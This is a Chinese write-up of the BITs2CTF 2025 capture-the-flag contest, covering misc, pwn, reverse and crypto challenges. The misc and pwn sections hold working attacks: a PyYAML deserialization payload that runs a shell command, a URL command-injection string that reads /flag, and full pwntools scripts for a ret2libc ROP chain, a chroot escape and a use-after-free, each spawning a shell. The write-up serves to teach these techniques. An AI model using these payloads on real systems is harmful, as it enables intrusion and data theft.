@@ -1,0 +1,663 @@
+#+TITLE: BITs2CTF 2025 Writeup
+#+DATE: <2025-11-22 Sat>
+
+* misc
+** 签到
+即得易见平凡，仿照上例显然。
+** GCC偷走了重要的函数！
+题目用 tree-sitter 禁了函数声明
+#+BEGIN_SRC python
+def check(code: str):
+    parser = Parser(C_LANGUAGE)
+    tree = parser.parse(code.encode())
+    function_node = tree.root_node.children[0]
+                                                                                                                          
+    if "/dev" in code:
+        err("What do you want to do?")
+        exit(1)
+                                                                                                                          
+    if function_node.type == "declaration":
+        if function_node.children[1].type == "function_declarator":
+            fail_exit()
+    elif function_node.type == "function_definition":
+        fail_exit()
+                                                                                                                          
+    ok("[Check Passed]".center(50, '-'))
+#+END_SRC
+这才算个啥，比 [[file:wp_jailctf_2025.org::stupɪd si plʌs plʌs][jailCTF]] 那道差远了
+#+BEGIN_SRC c
+__asm__(".global main; main: mov $1, %rax; mov $1, %rdi; lea message(%rip), %rsi; mov $12, %rdx; syscall; mov $60, %rax; xor %rdi, %rdi; syscall; .section .rodata; message: .asciz \"Hello World\\n\";");
+#+END_SRC
+
+** Rust，启动！
+#+BEGIN_SRC sh
+cargo new genshin
+#+END_SRC
+本来以为还得像 GeekGame 2025 那样拿 bisect 爆破，其实直接
+#+BEGIN_SRC rust
+const _: () = {
+    compile_error!(include_str!("../../../flag"));
+};
+fn main() {}
+#+END_SRC
+
+** Yaml笑传之CCB
+#+BEGIN_EXAMPLE
+!!python/object/apply:os.system ["cat ../flag"]
+#+END_EXAMPLE
+
+** 玄机在哪
+UU? 什么UU
+1. https://www.spammimic.com/decode.cgi
+   #+BEGIN_EXAMPLE
+   ~呜嗷嗷嗷嗷呜呜啊嗷嗷呜嗷呜呜啊呜呜嗷啊嗷啊呜~嗷嗷呜~嗷~呜嗷啊嗷嗷嗷嗷嗷呜呜啊啊嗷呜嗷呜呜啊呜嗷~啊嗷啊呜~啊嗷呜~嗷~呜嗷呜呜嗷嗷嗷嗷呜呜呜嗷啊呜嗷呜呜啊呜嗷呜啊嗷啊呜~呜嗷啊~嗷~呜嗷嗷~嗷嗷嗷嗷呜呜呜嗷啊呜嗷呜呜啊呜嗷嗷啊嗷啊呜~啊嗷呜~嗷~呜嗷~嗷嗷嗷嗷嗷呜呜啊呜嗷呜嗷呜呜啊呜嗷嗷啊嗷啊呜~~~啊~嗷~呜嗷啊啊嗷嗷嗷嗷呜呜嗷呜呜呜嗷呜呜啊呜啊呜啊嗷啊呜~呜嗷嗷~嗷~呜嗷呜嗷嗷嗷嗷嗷呜呜~呜啊呜嗷呜呜啊嗷嗷~啊嗷啊呜~啊~~~嗷~呜嗷嗷~嗷嗷嗷嗷呜呜呜呜~呜嗷呜呜啊呜啊嗷啊嗷啊呜~啊嗷啊~嗷~呜嗷啊~嗷嗷嗷嗷呜呜嗷呜呜呜嗷呜呜啊呜嗷呜啊嗷啊呜~呜嗷啊~嗷~呜嗷呜嗷嗷嗷嗷嗷呜呜呜嗷啊呜嗷呜呜啊呜嗷呜啊嗷啊呜~嗷~~~嗷~呜嗷嗷呜嗷嗷嗷嗷呜呜~啊呜呜嗷呜呜啊呜啊嗷啊嗷啊呜~呜嗷嗷~嗷~呜嗷~~嗷嗷嗷嗷呜呜呜啊嗷呜嗷呜呜啊呜嗷啊啊嗷啊呜~啊~~~嗷~呜嗷~嗷嗷嗷嗷嗷呜呜啊~嗷呜嗷呜呜啊呜嗷啊啊嗷啊呜~呜嗷呜~嗷~呜嗷啊呜嗷嗷嗷嗷呜呜呜呜~呜嗷呜呜啊呜啊嗷啊嗷啊呜~呜~~~嗷~呜嗷呜嗷嗷嗷嗷嗷呜呜呜嗷啊呜嗷呜呜啊呜啊~啊嗷啊呜~嗷~~~嗷~呜嗷~~嗷嗷嗷嗷呜呜~呜~呜嗷呜呜呜啊嗷呜啊嗷啊呜~嗷嗷啊~嗷~呜嗷呜嗷嗷嗷嗷嗷呜呜呜啊呜呜嗷呜呜啊~嗷嗷啊嗷啊呜~~~~~嗷~呜嗷呜啊呜嗷嗷嗷呜呜呜呜~呜嗷呜呜啊嗷~嗷啊嗷啊呜~嗷呜~~嗷~呜嗷呜~啊嗷嗷嗷呜呜呜嗷~呜嗷呜呜~嗷呜~啊嗷啊呜嗷嗷啊~啊
+   #+END_EXAMPLE
+2. https://roar.iiilab.com
+   #+BEGIN_EXAMPLE
+   M=&AE<F5?:7-?9FQA9SI"251S,D-41GM":71?:$%V15]5;DQI;6E4141?4$]T
+   '16YT:4%,?0``
+   #+END_EXAMPLE
+3. uudecode (M 开头 =`= 结尾太明显了)
+   #+BEGIN_EXAMPLE
+   begin 644 flag
+   M=&AE<F5?:7-?9FQA9SI"251S,D-41GM":71?:$%V15]5;DQI;6E4141?4$]T
+   '16YT:4%,?0`
+   `
+   end
+   there_is_flag:BITs2CTF{Bit_hAvE_UnLimiTED_POtEntiAL}
+   #+END_EXAMPLE
+
+* pwn
+** 签顺道
+f8fqgfm
+留作习题答略，读者自证不难。
+** 和溢位？
+overflow 中有一个和溢位
+#+BEGIN_SRC c
+if ( nbytes + v2[0] > 31 )
+{
+  printf(a0135m0m0137m_0);
+  exit(1);
+}
+#+END_SRC
+下有俩 read
+#+BEGIN_SRC c
+read(0, buf, nbytes);
+printf(a0134m0m_0, buf);
+read(0, buf, v2[0]);
+printf(a0131m0m_4);
+return v4 - __readfsqword(0x28u);
+#+END_SRC
+
+我本来想第一个 read 泄露 canary，第二个搞 ROP，结果发现无论如何设置两个 size，都有一个 read 由于 size 过大无法读。
+结果发现 =__stack_chk_fail= 是个假的， *壑溢卫！*
+
+那就好办了，直接泄露 PIE 基质，然后 ret2libc
+（着急 exp 写得有点乱）
+#+BEGIN_SRC python
+#!/usr/bin/python
+from pwn import *
+from time import sleep
+context(arch='amd64', os='linux', log_level='debug', terminal='foot')
+
+#gdb.attach(io)
+
+leak = lambda s: (p := u64(io.recvline()[:-1].ljust(8,b'\0')), log.success('%s: 0x%x' % (s, p)))[0]
+
+i=5
+context.log_level='info'
+print(i)
+filename = './pwn'
+elf = ELF(filename)
+io = remote('127.0.0.1', 34387)
+#io = process(filename)
+
+gadget = 0x0002A8
+calloverflow = 0x005BF
+callputs = 0x00355
+
+io.recvuntil('> ')
+io.sendline(f'{56+2}')
+io.recvuntil('> ')
+io.sendline(f'{2**64-40}')
+io.recvuntil('> ')
+io.send(cyclic(56)+p16((calloverflow & 0xfff) + (i<<12)))
+
+#io.interactive()
+
+sleep(1)
+io.recvuntil(cyclic(56))
+pie_high = u64(io.recv(6).ljust(8, b'\0')) & 0xfffffffff000
+print(hex(pie_high))
+
+sleep(1)
+
+io.recvuntil('> ')
+io.sendline(f'{56+40}')
+io.recvuntil('> ')
+io.sendline(f'{2**64-56-40}')
+io.recvuntil('> ')
+
+sleep(1)
+io.send(cyclic(56)+p64(pie_high+gadget)+p64((pie_high & 0xffffffff0000) + 0x7f88)+p64(pie_high+0x01a) # ret
+        +p64(pie_high+0x100) # got of puts
+        +p64(pie_high+calloverflow))
+
+sleep(1)
+io.recvuntil('卫！')
+io.recvline()
+io.recvuntil('\x1b[0m')
+puts = leak('puts')
+libc_base = puts - elf.libc.symbols['puts']
+system = libc_base + elf.libc.symbols['system']
+binsh = libc_base +0x00000000001cb42f
+
+sleep(1)
+io.recvuntil('> ')
+io.sendline(f'{56+32}')
+io.recvuntil('> ')
+io.sendline(f'{2**64-56-16}')
+io.recvuntil('> ')
+
+sleep(1)
+#ogs = [0x583ec, 0x583f3, 0xef4ce, 0xef52b]
+#gdb.attach(io)
+io.send(cyclic(56)+p64(pie_high+gadget)+p64(binsh)+p64(pie_high+0x01a)+p64(system))
+
+io.interactive()
+#+END_SRC
+当然最后有 1/16 概率成功
+
+
+** 三剑齐出，引爆BIT“人工智能年”！！！
+好一个 IoT，简单的命令注入
+#+BEGIN_SRC c
+__int64 __fastcall setIbitName(int a1, __int64 a2, __int64 a3, int a4, int a5, int a6)
+{
+  doSystemCmd((unsigned int)"echo %s > ./name", a1, (unsigned int)"echo %s > ./name", a4, a5, a6);
+  return 0;
+}
+#+END_SRC
+#+BEGIN_EXAMPLE
+GET /setIbitName?$(cat</flag)
+GET /getIbitName
+#+END_EXAMPLE
+
+** 🥷忍术🥷「我设了一个笼」
+还不是传统 seccomp 沙箱，是 chroot。
+注意到有一个 fd 没释放
+#+BEGIN_SRC c
+int banner()
+{
+  int fd; // [rsp+8h] [rbp-18h]
+  int st_size; // [rsp+Ch] [rbp-14h]
+  struct stat *buf; // [rsp+10h] [rbp-10h]
+  char *s; // [rsp+18h] [rbp-8h]
+
+  if ( open("./", 0) < 0 )                      // 3
+    exit(1);
+  puts("\x1B[01;36m        |===================|\x1B[01;33m      ~*~*~*~\x1B[01;36m");
+  puts(asc_2058);
+  puts("        |===================|================|");
+  puts(asc_20C8);
+  puts("                      |======================|");
+  puts("                                /\x1B[0m");
+  fd = open("./banner.logo", 0);
+#+END_SRC
+然后 cmd_cat 里面有个 sprintf 可以越界写 cwd
+#+BEGIN_SRC c
+__int64 __fastcall cmd_cat(char *a1)
+{
+  int fd; // [rsp+14h] [rbp-3Ch]
+  off_t offset; // [rsp+18h] [rbp-38h] BYREF
+  size_t count; // [rsp+20h] [rbp-30h]
+  void *ptr; // [rsp+28h] [rbp-28h]
+  size_t size; // [rsp+30h] [rbp-20h]
+  struct stat *buf; // [rsp+38h] [rbp-18h]
+  void *v8; // [rsp+40h] [rbp-10h]
+  unsigned __int64 v9; // [rsp+48h] [rbp-8h]
+
+  v9 = __readfsqword(0x28u);
+  if ( !a1 )
+    return 1;
+  ptr = strdup(a1);
+  sprintf(a1, "./%s", (const char *)ptr);
+#+END_SRC
+
+#+BEGIN_SRC python
+#!/usr/bin/python
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug', terminal='foot')
+
+filename = './jail'
+#filename = './jail.bak'
+#elf = ELF(filename)
+io = remote('127.0.0.1', 41081)
+#io = process(filename)
+
+leak = lambda s: (p := u64(io.recvline()[:-1].ljust(8,b'\0')), log.success('%s: 0x%x' % (s, p)))[0]
+
+#gdb.attach(io)
+io.recv()
+io.sendline(b'cat '+cyclic(506)+p8(3))
+io.recv()
+io.sendline(b'cat ./../../../../../../../flag')
+
+io.interactive()
+#+END_SRC
+有 chroot 不好调试，可以先把 chroot patch 掉再调，
+
+
+** 🥷忍术🥷「吓我一跳我释放堆块」
+真“菜单”堆。
+上来发现每 3 秒会返回主菜单，果断 patch 掉先。
+结果发现没思路，扔给 Chat 老师，结果正是 alarm handler 造成 UAF。
+#+BEGIN_SRC c
+void __noreturn handle()
+{
+  int v0; // eax
+
+  putchar(10);
+  printf(format);
+  v0 = rand();
+  printf(a0133m0m0136m, *(&escape + v0 % 3));
+  free(user);
+  siglongjmp(jbuf, 1);
+}
+#+END_SRC
+#+BEGIN_SRC c
+int login()
+{
+  _QWORD *v0; // rbx
+  int *v1; // rax
+  char *v2; // rax
+  char *v4; // [rsp+8h] [rbp-18h]
+
+  v0 = user;
+  v0[1] = malloc(0x100u);
+  printf(...);
+  v4 = fgets(*((char **)user + 1), 256, stdin);
+#+END_SRC
+最终是要把 user[0] 设为 1
+#+BEGIN_SRC c
+unsigned __int64 menu()
+{
+  int v1; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  v1 = 0;
+  printf(...);
+  __isoc23_scanf("%d%*c", &v1);
+  if ( v1 == 4 )
+  {
+    if ( *(_DWORD *)user == 1 )
+    {
+      printf(...);
+      system("/bin/sh");
+    }
+#+END_SRC
+所以在菜单里分配个 16 大小的块就行
+#+BEGIN_SRC python
+#!/usr/bin/python
+from pwn import *
+from time import sleep
+context(arch='amd64', os='linux', log_level='debug', terminal='foot')
+
+filename = './pwn'
+elf = ELF(filename)
+io = remote('127.0.0.1', 34757)
+#io = process(filename)
+
+leak = lambda s: (p := u64(io.recvline()[:-1].ljust(8,b'\0')), log.success('%s: 0x%x' % (s, p)))[0]
+
+io.sendlineafter('姓名', 'aaa')
+sleep(4)
+io.sendlineafter('姓名', 'aaa')
+io.sendlineafter('?!', '1')
+io.sendlineafter('长度', '16')
+io.sendline(p64(1))
+#gdb.attach(io)
+
+io.sendlineafter('?!', '4') # run!
+io.sendline('cat /flag')
+
+io.interactive()
+#+END_SRC
+
+** 🥷忍术🥷「写死你 • 内核原语」
+干出非预期了
+
+* Reverse
+最后时间懒得看了，直接GPT 一把梭
+** ChaCha20
+https://chatgpt.com/share/69225dbe-602c-800e-9699-c2f83df2dce6
+#+BEGIN_SRC python
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
+from cryptography.hazmat.backends import default_backend
+from Crypto.Util.number import long_to_bytes
+import binascii
+
+k1 = 89156737880809474145449532029493055444849328922741582677584755390029529653680
+n1 = 20979402206073728478533457085044507592
+ciphertext = bytes.fromhex("a8c123f27ed9d34a6040a98f0b9d5e22930ca34bd3195e27a1e73725aba2f3eff888")
+
+def chacha20_decrypt(ciphertext, key, nonce):
+    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
+    decryptor = cipher.decryptor()
+    return decryptor.update(ciphertext)
+
+for seed in range(100):
+    import random
+    random.seed(seed)
+    k2_guess = random.getrandbits(128)
+    n2_guess = random.getrandbits(64)
+    key_guess = long_to_bytes(k1 ^ k2_guess)
+    nonce_guess = long_to_bytes(n1 ^ n2_guess)
+    
+    try:
+        plaintext = chacha20_decrypt(ciphertext, key_guess, nonce_guess)
+        if b"BIT" in plaintext:
+            print("Seed:", seed)
+            print("Flag:", plaintext)
+            break
+    except:
+        pass
+#+END_SRC
+** 奶龙与小七之大战Web Assembly
+https://chatgpt.com/share/69225dfa-c7c0-800e-bb82-0aa88cdccb23
+#+BEGIN_SRC python
+enc = [75,66,89,124,51,64,81,65,98,76,46,46,32,76,113,39,71,24,12,112,120,19,80,0,79,8,98,10,68,80,86,4,124,126,43,58,112,114,60,24,61,104,59,108,101,100,102,51,54,92,5,92,62,91,81,87,65,79,77,78,65,29,67,40,189,229,233,208,233,178,176,216,206,175,168,242,236]
+def g(i): return ((i<<1)+1) & 0xFFFFFFFF
+flag = ''.join(chr((c ^ (g(i) ^ 8)) & 0xFF) for i,c in enumerate(enc))
+print(flag)
+#+END_SRC
+** math
+https://chatgpt.com/share/69225e41-752c-800e-8f11-388bca51bfd3
+#+BEGIN_SRC python
+from z3 import *
+
+# ---------------------------
+# Implement bit-accurate fun1
+# ---------------------------
+def fun1(a1, a2):
+    res = BitVecVal(0, 64)
+    carry = BitVecVal(0, 1)       # 1-bit carry
+
+    t1 = a1
+    t2 = a2
+    pos = 0
+
+    while pos < 64:
+        b1 = Extract(0, 0, t1)
+        b2 = Extract(0, 0, t2)
+
+        # sum bit
+        sum_bit = b1 ^ b2 ^ carry
+        res = res | (ZeroExt(63, sum_bit) << pos)
+
+        # next carry
+        carry = (b1 & b2) | (b1 & carry) | (b2 & carry)
+
+        t1 = LShR(t1, 1)
+        t2 = LShR(t2, 1)
+        pos += 1
+
+    return res
+
+
+
+# -------------------------
+# fun2 = fun1(a1, -a2)
+# -------------------------
+def fun2(a1, a2):
+    return fun1(a1, -a2)
+
+
+# -------------------------
+# fun3: shift-add multiplier
+# -------------------------
+def fun3(a1, a2):
+    acc = BitVecVal(0, 32)
+    shift = 0
+    t1 = a1
+    while shift < 32:
+        b = Extract(0, 0, t1)
+        acc = If(b == 1, acc + (a2 << shift), acc)
+        t1 = LShR(t1, 1)
+        shift += 1
+    return acc
+
+
+# -------------------------
+# fun4: XOR combine
+# -------------------------
+def fun4(a1, a2):
+    res = BitVecVal(0, 32)
+    shift = 0
+    t1 = a1
+    t2 = a2
+    while shift < 32:
+        b1 = Extract(0, 0, t1)
+        b2 = Extract(0, 0, t2)
+        bit = b1 ^ b2
+        res = res + (ZeroExt(31, bit) << shift)
+        t1 = LShR(t1, 1)
+        t2 = LShR(t2, 1)
+        shift += 1
+    return res
+
+
+# solver
+s = Solver()
+
+# six variables
+a, b, c, d, e, f = [BitVec(x, 32) for x in "abcdef"]
+
+# bounds
+for v in [a, b, c, d, e, f]:
+    s.add(v > 0x186A0, v <= 0xF423F)
+
+# expressions from judge()
+v1 = Extract(31, 0, fun1(a, b)) % 0xE8329
+t1 = Extract(31, 0, fun2(a, b))
+t2 = fun3(BitVecVal(2, 32), c)
+v2 = Extract(31, 0, fun1(t1, t2))
+
+t3 = fun3(BitVecVal(4, 32), f)
+v3 = fun4(t3, d)
+
+t4 = Extract(31, 0, fun2(d, e))
+v4 = fun3(BitVecVal(5, 32), t4)
+
+v5 = Extract(31, 0, fun1(a, f))
+
+t5 = fun3(BitVecVal(3, 32), d)
+v6 = Extract(31, 0, fun2(t5, t4))
+
+# constraints
+s.add(v1 == 597141)
+s.add(v2 == 1644082)
+s.add(v3 == 1161537)
+s.add(v4 == 343890)
+s.add(v5 == 1136538)
+s.add(v6 == 1952901)
+
+# solve
+if s.check() == sat:
+    m = s.model()
+    aa = m[a].as_long()
+    bb = m[b].as_long()
+    cc = m[c].as_long()
+    dd = m[d].as_long()
+    ee = m[e].as_long()
+    ff = m[f].as_long()
+    print("Solution:")
+    print(aa, bb, cc, dd, ee, ff)
+    print(f"BITs2CTF{{{aa:x}{bb:x}{cc:x}{dd:x}{ee:x}{ff:x}}}")
+else:
+    print("No solution.")
+#+END_SRC
+** 奶龙与小七之真假奶龙
+https://chatgpt.com/share/69225ea4-4588-800e-b651-5ee4d7632a40
+#+BEGIN_SRC python
+r1_0 = [
+  125,158,51,84,54,171,51,146,56,134,50,51,51,54,132,227,54,149,53,167,
+  54,149,270,51,51,54,53,167,262,379,50,171,266,48,54,158,48,143,51,164,
+  50,54,51,139,234,50,48,143,243,53,171,50,164,276,371,53,171,210,327,50,
+  139,234,267,53,163,50,150,245,51,51,53,140,263,333,417,484,52,167,251,
+  324,390
+]
+
+rev = []
+
+for i in range(len(r1_0)):
+    out = r1_0[i]
+
+    if 48 <= out <= 56:
+        # 数字映射
+        digit = (out - 48 - 2) % 9
+        ch = chr(digit + 48)
+    else:
+        if i == 0:
+            ch = chr(out)
+        else:
+            ch = chr(out - r1_0[i-1])
+    rev.append(ch)
+
+original = "".join(rev[::-1])
+print(original)
+
+#+END_SRC
+
+
+* Crypto
+** Are you crazy
+完全没学过 Crypto，全靠 GPT
+https://chatgpt.com/share/69225d6b-71d0-800e-8d71-731ba592ac78
+#+BEGIN_SRC python
+R = 写不下了
+n = 2153179220869251023119572723180893711902645543152637943731734701294568162332409526547996305090240667907334961025514382934065876606376618750038150094358541372188694190350714711523686453320118845117227539430920961283892972668117594228344832968048255997244818795608607758249123769021706854181505936911005280767282890268494390945078934647221175427617822336646462689419497083724506050216393405677498453982351514753862597822248926437262535770909268839548812176912975696611062177634403576792094582538064653922499584210273989938950794181333050794855061474412683743337126198677496862701564497304939379750537552774385914956157
+c = 1768224457502977610551256076456857771629964531628501905305370101879058278252190110067876223549492461081095503746412750727182554282895596593644215216118808465719980601801526582553698142437810224965723180333975440132848820891258535807732872322967204922341709633067759328523431984378014075161251353495191269984223084018879422438636504205031167179346391806027083729410706297199819234758308339991791803430374715952151062387735191350236379020840925968702794705833862406547573427528448698620317504919735905571259861657187542687328722951276501089823353045585511213838857387238345639926727847467959806415734820088418877027093
+
+#!/usr/bin/env python3
+# Requires Python 3.8+
+from Crypto.Util.number import long_to_bytes, inverse
+import hashlib
+import math
+import sys
+from functools import reduce
+from math import gcd
+
+n_pub = n            # the printed n
+
+# ---------- helper functions ----------
+def parity(x):
+    return bin(x).count('1') & 1
+
+def vinad_equivalent_value_from_R(R):
+    # compute bitstring bits_i = parity(r_i) for each r_i
+    bits = ''.join(str(parity(r)) for r in R)
+    p0 = int(bits, 2)
+    nb = len(bits)
+    mask = (1 << nb) - 1
+    p1 = p0 ^ mask
+    return p0, p1, mask
+
+def try_factor_n_by_vinad(n_pub, p0, p1):
+    if n_pub % p0 == 0:
+        return p0
+    if n_pub % p1 == 0:
+        return p1
+    return None
+
+def pollard_p_minus_one(n, B=2000000):
+    # simple Pollard p-1: try increasing smoothness bound until a factor found
+    a = 2
+    for j in range(2, B):
+        a = pow(a, j, n)
+        g = math.gcd(a-1, n)
+        if 1 < g < n:
+            return g
+    return None
+
+# ---------- exploit ----------
+def main():
+    global R, n_pub, c
+    if R == [...] or n_pub == 0 or c == 0:
+        print("Please fill R, n_pub, and c with the values printed by the challenge.")
+        sys.exit(1)
+
+    print("[*] computing vinad candidates from R...")
+    p0, p1, mask = vinad_equivalent_value_from_R(R)
+    print(f"    p0 bitlen = {p0.bit_length()}, p1 bitlen = {p1.bit_length()}")
+
+    print("[*] checking which candidate divides n...")
+    p = try_factor_n_by_vinad(n_pub, p0, p1)
+    if p is None:
+        print("[-] neither candidate divides n — unexpected. Exiting.")
+        sys.exit(1)
+    q = n_pub // p
+    print(f"[+] found p (RSA prime): {p}")
+    print(f"[+] found q (RSA prime): {q}")
+
+    phi = (p - 1) * (q - 1)
+
+    # e must be either p0 or p1 as well (vinad(r + 0x10001, R) is either p0 or p1)
+    print("[*] trying both e candidates...")
+    e_candidates = [p0, p1]
+    d = None
+    chosen_e = None
+    for e_try in e_candidates:
+        if gcd(e_try, phi) == 1:
+            try:
+                d_try = inverse(e_try, phi)
+                d = d_try
+                chosen_e = e_try
+                break
+            except Exception:
+                continue
+    if d is None:
+        print("[-] failed to invert any e candidate. Exiting.")
+        sys.exit(1)
+    print(f"[+] chosen e = {chosen_e}")
+    print("[*] computing m_plus_S = c^d mod n ...")
+    m_plus_S = pow(c, d, n_pub)
+
+    S = sum(R)
+    m = m_plus_S - S
+    if m <= 0:
+        print("[-] recovered m non-positive. Maybe modular wrap occurred; try adding/subtracting multiples of n.")
+        # try modulo n adjustments:
+        for k in range(0,5):
+            cand = (m_plus_S + k * n_pub) - S
+            if cand > 0:
+                m = cand
+                print("[*] adjusted m found with k =", k)
+                break
+        else:
+            sys.exit(1)
+
+    print(f"[+] recovered m (bitlen={m.bit_length()})")
+
+    # Factor m with Pollard p-1 (works because m1-1 is smooth)
+    print("[*] factoring m with Pollard p-1 (might take a short while)...")
+    factor = pollard_p_minus_one(m, B=2000000)
+    if factor is None:
+        print("[-] pollard p-1 failed with current bound. Try increasing B.")
+        sys.exit(1)
+    m1 = factor
+    m2 = m // m1
+    print(f"[+] factors found: m1 = {m1} (bitlen {m1.bit_length()}), m2 = {m2}")
+
+    # convert to bytes and compute md5 digests
+    m1_bytes = long_to_bytes(m1)
+    m2_bytes = long_to_bytes(m2)
+    md5_m1 = hashlib.md5(m1_bytes).hexdigest()
+    md5_m2 = hashlib.md5(m2_bytes).hexdigest()
+    flag = f"BITs2CTF{{{md5_m1}<*_*>{md5_m2}}}"
+    print("[+] FLAG =", flag)
+
+if __name__ == "__main__":
+    main()
+#+END_SRC
